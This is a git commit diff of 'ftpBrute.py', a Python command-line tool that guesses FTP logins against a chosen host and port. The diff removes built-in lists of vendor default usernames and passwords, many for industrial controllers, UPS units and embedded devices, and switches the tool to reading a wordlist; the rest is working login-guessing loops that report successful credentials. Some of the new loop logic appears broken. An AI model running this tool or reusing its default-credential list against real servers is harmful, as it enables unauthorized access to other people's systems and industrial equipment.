0f5713fd0c3cc9d7bfbce6b130c59f4d69978add
x6h057 <x6h057.mail@proton.me>
2024-12-14 17:33:23 +0100

    [+] Fixed v1.2.7

--- ftpBrute.py
+++ ftpBrute.py
@@ -3,7 +3,7 @@ import argparse
 from colorama import Fore, Style
 import sys
 
-version = "v1.1.0"
+version = "v1.2.7"
 
 logo = r"""
     ________________        ____             __     
@@ -33,151 +33,12 @@ args = parser.parse_args()
 if not args.host:
     parser.print_help()
 
-
-usernames = [
-    "anonymous",
-    "root",
-    "root",
-    "ftp",
-    "admin",
-    "localadmin",
-    "admin",
-    "apc",
-    "admin",
-    "Root",
-    "Admin",
-    "User",
-    "Guest",
-    "ftp",
-    "admin",
-    "a",
-    "admin",
-    "adtec",
-    "admin",
-    "none",
-    "instrument",
-    "user",
-    "root",
-    "default",
-    "admin",
-    "nmt",
-    "admin",
-    "supervisor",
-    "user1",
-    "avery",
-    "IEIeMerge",
-    "ADMIN",
-    "beijer",
-    "Admin",
-    "admin",
-    "admin",
-    "root",
-    "se",
-    "admin",
-    "device",
-    "apc",
-    "apc",
-    "dm",
-    "dmftp",
-    "httpadmin",
-    "user",
-    "MELSEC",
-    "QNUDECPU",
-    "ftp_boot",
-    "uploader",
-    "ftpuser",
-    "USER",
-    "qbf77101",
-    "ntpupdate",
-    "sysdiag",
-    "wsupgrade",
-    "pcfactory",
-    "loader",
-    "test",
-    "webserver",
-    "fdrusers",
-    "nic2212",
-    "user",
-    "su",
-    "MayGion",
-    "admin",
-    "PlcmSpIp"
-]
-
-passwords = [
-    "anonymous",
-    "rootpasswd",
-    "12hrs37",
-    "b1uRR3",
-    "admin",
-    "localadmin",
-    "1234",
-    "apc",
-    "nas",
-    "wago",
-    "wago",
-    "user",
-    "guest",
-    "ftp",
-    "password",
-    "avery",
-    "123456",
-    "none",
-    "admin12345",
-    "dpstelecom",
-    "instrument",
-    "password",
-    "password",
-    "default",
-    "default",
-    "Janitza",
-    "supervisor",
-    "pass1",
-    "avery",
-    "eMerge",
-    "12345",
-    "beijer",
-    "admin",
-    "1234",
-    "1111",
-    "admin",
-    "1234",
-    "stingray",
-    "apc",
-    "apc",
-    "ftp",
-    "ftp",
-    "fhttpadmin",
-    "system",
-    "MELSEC",
-    "QNUDECPU",
-    "ftp_boot",
-    "ZYPCOM",
-    "password",
-    "USER",
-    "hexakisoctahedron",
-    "ntpupdate",
-    "factorycast@schneider",
-    "wsupgrade",
-    "pcfactory",
-    "fwdownload",
-    "testingpw",
-    "webpages",
-    "sresurdf",
-    "poiuypoiuy",
-    "user00",
-    "ko2003wa",
-    "maygion.com",
-    "9999",
-    "PlcmSpIp"
-]
-
+wordlist = "wordlist.txt"
 
 def bruteforce():
     try:
         print(f"{Fore.RED}{logo}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}Starting FTP-Brute: {Style.RESET_ALL}[{Fore.RED}{args.host}{Style.RESET_ALL}:{Fore.RED}{args.port}{Style.RESET_ALL}]")
-        #bruteforce with given values
         if args.username and args.password:
             print(f"{Fore.YELLOW}Bruteforcing with custom credentials:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL}")
             try:
@@ -188,27 +49,30 @@ def bruteforce():
                 print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         elif args.username:
             print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN}[{args.username}]{Style.RESET_ALL}")
-            for pwd in passwords:
-                try:
-                    ftpserver.connect(args.host, args.port)
-                    ftpserver.login(args.username, pwd)
-                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
-                except ftplib.all_errors as e:
-                    print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
+            with open(wordlist, 'r') as file:
+                for pwd in file:
+                    try:
+                        ftpserver.connect(args.host, args.port)
+                        ftpserver.login(args.username, pwd)
+                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
+                    except ftplib.all_errors as e:
+                        print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         elif args.password:
             print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN} [{args.password}] {Style.RESET_ALL}")
-            for user in usernames:
-                try:
-                    ftpserver.connect(args.host, args.port)
-                    ftpserver.login(user, args.password)
-                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
-                except ftplib.all_errors as e:
-                    print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
+            with open(wordlist, 'r') as file:
+                for user in file:
+                    try:
+                        ftpserver.connect(args.host, args.port)
+                        ftpserver.login(user, args.password)
+                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
+                    except ftplib.all_errors as e:
+                        print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         else:
-            #bruteforcing with buildin list
-            for user in usernames:
-                for pwd in passwords:
-                    print(f"{Fore.YELLOW}Bruteforcing with buildin credentials: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
+            with open(wordlist, 'r') as file:
+                credentials = [line.strip() for line in file]
+            for user in credentials:
+                for pwd in credentials:
+                    print(f"{Fore.YELLOW}Bruteforcing with built-in credentials: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                     try:
                         ftpserver.connect(args.host, args.port)
                         ftpserver.login(user, pwd)
@@ -216,15 +80,11 @@ def bruteforce():
                         break
                     except ftplib.all_errors as e:
                         print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
-                        continue
-
         if args.wordlist:
             try:
                 with open(args.wordlist, 'r') as file:
-                    wordlist = file.readlines()
-                    for user in wordlist:
-                        user = user.strip()
-                        for pwd in passwords:
+                    for user in file:
+                        for pwd in file:
                             print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                             try:
                                 ftpserver.connect(args.host, args.port)
@@ -240,7 +100,7 @@ def bruteforce():
         elif args.username and args.wordlist:
             try:
                 with open(args.wordlist, 'r') as file:
-                    for pwd in passwords:
+                    for pwd in file:
                         print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                         try:
                             ftpserver.connect(args.host, args.port)
@@ -256,7 +116,7 @@ def bruteforce():
         elif args.password and args.wordlist:
             try:
                 with open(args.wordlist, 'r') as file:
-                    for user in usernames:
+                    for user in file:
                         print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                         try:
                             ftpserver.connect(args.host, args.port)
@@ -272,4 +132,5 @@ def bruteforce():
     except KeyboardInterrupt:
         print(f"{Fore.RED}Bye!{Style.RESET_ALL}")
         sys.exit(0)  
+
 bruteforce()
